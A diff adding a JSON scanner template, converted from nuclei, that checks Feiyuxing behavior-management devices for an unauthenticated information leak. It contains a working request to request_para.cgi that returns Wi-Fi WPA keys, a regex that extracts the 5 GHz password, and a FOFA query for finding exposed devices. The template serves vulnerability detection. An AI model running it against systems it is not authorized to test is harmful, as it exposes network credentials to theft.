@@ -1,0 +1,136 @@
+{
+  "id": "feiyuxing-info-leak",
+  "name": "Feiyuxing Information - Exposure",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "Feiyuxing enterprise-level intelligent online behavior management system has authority bypass and information leakage vulnerabilities, which can obtain administrator rights and user passwords\n",
+  "references": [
+    "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/%E9%A3%9E%E9%B1%BC%E6%98%9F/%E9%A3%9E%E9%B1%BC%E6%98%9F%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md",
+    "https://github.com/hktalent/scan4all/blob/main/lib/goby/goby_pocs/Adslr_Enterprise_online_behavior_management_system_Information_leakage.json",
+    "https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%A3%9E%E9%B1%BC%E6%98%9F%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "misconfig",
+    "exposure",
+    "iot",
+    "wpa",
+    "wpa2"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\"飞鱼星企业级智能上网行为管理系统\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/request_para.cgi?parameter\u003dwifi_get_5g_host",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(body,\"WPA2-PSK\") || contains(body,\"WPA-PSK\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "feiyuxing-info-leak",
+    "info": {
+      "name": "Feiyuxing Information - Exposure",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "Feiyuxing enterprise-level intelligent online behavior management system has authority bypass and information leakage vulnerabilities, which can obtain administrator rights and user passwords\n",
+      "reference": [
+        "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/%E9%A3%9E%E9%B1%BC%E6%98%9F/%E9%A3%9E%E9%B1%BC%E6%98%9F%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md",
+        "https://github.com/hktalent/scan4all/blob/main/lib/goby/goby_pocs/Adslr_Enterprise_online_behavior_management_system_Information_leakage.json",
+        "https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%A3%9E%E9%B1%BC%E6%98%9F%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "title\u003d\"飞鱼星企业级智能上网行为管理系统\""
+      },
+      "tags": "misconfig,exposure,iot,wpa,wpa2"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/request_para.cgi?parameter\u003dwifi_get_5g_host"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(body,\"WPA2-PSK\") || contains(body,\"WPA-PSK\")"
+            ],
+            "condition": "and"
+          }
+        ],
+        "extractors": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "\"wl_passwd_5g\":\"(.*?)\""
+            ],
+            "group": 1,
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
